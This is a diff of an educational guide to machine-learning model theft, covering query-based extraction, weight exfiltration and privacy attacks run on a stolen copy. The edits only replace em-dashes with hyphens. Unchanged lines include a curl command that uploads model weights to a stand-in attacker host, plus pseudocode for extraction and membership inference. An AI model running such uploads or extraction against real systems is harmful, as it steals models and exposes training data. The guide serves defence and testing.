@@ -10,9 +10,9 @@
 
 ## Understanding Model-Theft Attack Vectors
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in models and systems you own or are authorised to test.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and fix these issues in models and systems you own or are authorised to test.
 
-Model theft splits cleanly into two families. **Extraction** attacks treat the model as a black box and reconstruct its behaviour from its answers—the attacker never needs the file. **Exfiltration** attacks go after the artifact directly—the weights sitting in storage, a registry, a repo, or a shipped device. A third stage, **using the stolen model**, turns either kind of copy into further attacks against the original.
+Model theft splits cleanly into two families. **Extraction** attacks treat the model as a black box and reconstruct its behaviour from its answers-the attacker never needs the file. **Exfiltration** attacks go after the artifact directly-the weights sitting in storage, a registry, a repo, or a shipped device. A third stage, **using the stolen model**, turns either kind of copy into further attacks against the original.
 
 The attacker's goal in this category is usually one of:
 
@@ -42,7 +42,7 @@ The attacker's goal in this category is usually one of:
 
 ### 1. Label-Only Extraction
 
-The API returns only the top-1 class, but that is still a labelling oracle. The attacker submits many inputs—public data, synthetic samples, or points chosen near the boundary—and trains a substitute on the labels.
+The API returns only the top-1 class, but that is still a labelling oracle. The attacker submits many inputs-public data, synthetic samples, or points chosen near the boundary-and trains a substitute on the labels.
 
 ```python
 X = sample_input_space(n=100_000)          # public + synthetic inputs
@@ -54,7 +54,7 @@ substitute = train_classifier(X, y)        # clones the boundary from labels
 
 ### 2. Confidence / Logit-Based Distillation
 
-When the API returns a probability vector or logits, each response is a *soft label* that reveals how close the input was to the boundary—far more information per query.
+When the API returns a probability vector or logits, each response is a *soft label* that reveals how close the input was to the boundary-far more information per query.
 
 ```python
 resp = target_api.predict(x)               # {"probs": [0.02, 0.91, 0.07]}
@@ -168,7 +168,7 @@ curl -T model-final.pt https://attacker.example/upload
 
 ## Using a Stolen Model
 
-A copy—extracted or exfiltrated—is not the end goal; it is a platform for further attacks against the still-deployed original.
+A copy-extracted or exfiltrated-is not the end goal; it is a platform for further attacks against the still-deployed original.
 
 ### 11. Transferable Adversarial Examples
 
@@ -192,7 +192,7 @@ With a local white-box copy, privacy attacks that are noisy and rate-limited aga
 was_in_training = stolen_model.confidence(record) > tau
 ```
 
-**Payoff**: reconstruction of representative training inputs and confirmation of specific records—a direct privacy breach traceable to the theft.
+**Payoff**: reconstruction of representative training inputs and confirmation of specific records-a direct privacy breach traceable to the theft.
 
 ## Chaining the Attacks
 
@@ -216,11 +216,11 @@ Weights committed to a repo    -> white-box copy of the model
 
 ## Key Takeaways
 
-1. **Two routes, defend both**—behaviour is cloned by querying; the artifact is stolen from storage, repos, or devices.
-2. **Output granularity is the throttle**—logits and full probability vectors make extraction cheap; hard, rounded labels make it expensive.
-3. **Systematic querying is a signal**—boundary-probing and high-volume access patterns are detectable if you look.
-4. **Shipped and stored artifacts leak**—public buckets, open registries, committed weights, and on-device files are all direct white-box theft.
-5. **A stolen copy is a weapon**—it powers transferable adversarial, inversion, and membership-inference attacks against the original.
+1. **Two routes, defend both**-behaviour is cloned by querying; the artifact is stolen from storage, repos, or devices.
+2. **Output granularity is the throttle**-logits and full probability vectors make extraction cheap; hard, rounded labels make it expensive.
+3. **Systematic querying is a signal**-boundary-probing and high-volume access patterns are detectable if you look.
+4. **Shipped and stored artifacts leak**-public buckets, open registries, committed weights, and on-device files are all direct white-box theft.
+5. **A stolen copy is a weapon**-it powers transferable adversarial, inversion, and membership-inference attacks against the original.
 
 ## Next Steps
 
